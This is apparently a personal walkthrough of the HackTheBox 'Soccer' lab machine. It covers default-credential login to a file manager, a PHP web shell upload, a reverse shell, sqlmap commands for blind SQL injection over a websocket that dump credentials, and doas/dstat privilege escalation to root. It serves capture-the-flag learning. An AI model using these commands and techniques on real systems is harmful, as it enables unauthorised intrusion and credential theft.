### NMAP

```
sudo nmap -sC -sV -oN soccer-nmap 10.10.11.194
```

![[HackTheBox/Linux/attachments/Pasted image 20250504212941.png]]
- 22, 80, 9091

Add `soccer.htb` to `/etc/hosts`

Navigate to website 

![[HackTheBox/Linux/attachments/Pasted image 20250504213210.png]]

### Gobuster 

```
gobuster dir -u http://soccer.htb/ -w /usr/share/Seclists/Discovery/Web-Content/raft-small-words.txt
```

![[HackTheBox/Linux/attachments/Pasted image 20250504213629.png]]

Some results
![[HackTheBox/Linux/attachments/Pasted image 20250504213739.png]]
- /tiny

Taking a look at soccer[.]htb/tiny and we get a login page
![[HackTheBox/Linux/attachments/Pasted image 20250504213901.png]]

Googling "H3K Tiny File Manager GitHub" to find source code 

We find an exploitdb poc giving default creds of `admin:admin@123`

Entering these default creds and we get logged in

![[HackTheBox/Linux/attachments/Pasted image 20250504214212.png]]

There is an uploads file option 

![[HackTheBox/Linux/attachments/Pasted image 20250504214259.png]]

Let's upload a shell.php file 

![[HackTheBox/Linux/attachments/Pasted image 20250504214351.png]]

It uploads

![[HackTheBox/Linux/attachments/Pasted image 20250504214429.png]]

Navigate to /uploads/shell.php and provide 'whoami' command and we have code execution

![[HackTheBox/Linux/attachments/Pasted image 20250504214535.png]]

Let's get a reverse shell using Burp repeater 

Burp reverse shell request
![[HackTheBox/Linux/attachments/Pasted image 20250504214653.png]]

Set up nc listener on port 9001

Catch the shell 
![[HackTheBox/Linux/attachments/Pasted image 20250504214757.png]]

Get interactive shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
export TERM=xterm
```

```
Ctrl + Z
```

```
stty raw -echo; fg
```

Let's see what is on port 9091 

```
ss -lntp
```

![[HackTheBox/Linux/attachments/Pasted image 20250504215121.png]]

Checking out the nginx sites enabled 

```
ls /etc/nginx/sites-enabled
```

We see `soc-player.htb`

![[HackTheBox/Linux/attachments/Pasted image 20250504215438.png]]

Let's add `soc-player.soccer.htb` to `/etc/hosts`

Navigate to this site 

![[HackTheBox/Linux/attachments/Pasted image 20250504215611.png]]

This site also has a login page 
![[HackTheBox/Linux/attachments/Pasted image 20250504215654.png]]

Let's register as a new user on the site and login 

![[HackTheBox/Linux/attachments/Pasted image 20250504215745.png]]

Let's test out some Boolean SQLi payloads 


![[HackTheBox/Linux/attachments/Pasted image 20250504215845.png]]
- successful query means probable vulnerability to boolean sqli

Intercept this request in Burp 

![[HackTheBox/Linux/attachments/Pasted image 20250504220055.png]]
- it's a web socket

Go to proxy settings bc this is a web socket and ensure these boxes are checked 

![[HackTheBox/Linux/attachments/Pasted image 20250504220204.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250504220302.png]]

Copy this request to file "injection.req"

### SQLMap

Use websocket url to construct sqlmap

![[HackTheBox/Linux/attachments/Pasted image 20250504220535.png]]

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch
```

![[HackTheBox/Linux/attachments/Pasted image 20250504220828.png]]

SQLmap is saying the parameter isn't injectable :/

![[HackTheBox/Linux/attachments/Pasted image 20250504220941.png]]

Refining sqlmap query 

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch
```

![[HackTheBox/Linux/attachments/Pasted image 20250504221200.png]]

Result: we do have a boolean-based blind sqlmap
![[HackTheBox/Linux/attachments/Pasted image 20250504221252.png]]

Now re-run sqlmap query with --dbs to get a list of the databases

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10
```

![[HackTheBox/Linux/attachments/Pasted image 20250504221356.png]]

We got a database name: soccer_db

![[HackTheBox/Linux/attachments/Pasted image 20250504221537.png]]

Now rerun sqlmap query with the database name and the --dump flag

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --threads 10 -D soccer_db --dump
```

![[HackTheBox/Linux/attachments/Pasted image 20250504221714.png]]

Result: we get creds!!
![[HackTheBox/Linux/attachments/Pasted image 20250504221841.png]]
PlayerOftheMatch2022
### SSH in with found credentials

```
ssh player@10.10.11.194
```

![[HackTheBox/Linux/attachments/Pasted image 20250504222023.png]]

### LinPEAS

Execute linpeas on the box

Interesting 
![[HackTheBox/Linux/attachments/Pasted image 20250504222700.png]]

How to find this manually 

```
find / -perm -4000 -ls 2>/dev/null
```

![[HackTheBox/Linux/attachments/Pasted image 20250504222842.png]]

DOAS executes commands as another user (like sudo)

Try to find a config for doas 

```
find / 2>/dev/null | grep doas
```

![[HackTheBox/Linux/attachments/Pasted image 20250504223038.png]]

Looking at one of these configs

![[HackTheBox/Linux/attachments/Pasted image 20250504223111.png]]

We discovered earlier that we have access to the dstat directory through being in the player group:

![[HackTheBox/Linux/attachments/Pasted image 20250504223225.png]]

Run `man dstat` to see what it is 

We see that /usr/share/dstat has a bunch of python files 

![[HackTheBox/Linux/attachments/Pasted image 20250504223432.png]]

Checking GTFO bins for dstat 

![[HackTheBox/Linux/attachments/Pasted image 20250504223550.png]]

Let's create our own dstat plugin for privilege escalation called pleasesubscribe

![[HackTheBox/Linux/attachments/Pasted image 20250504223655.png]]

Then execute the plugin 

```
doas /usr/bin/dstat --pleasesubscribe
```

![[HackTheBox/Linux/attachments/Pasted image 20250504223900.png]]

⭐ got root ⭐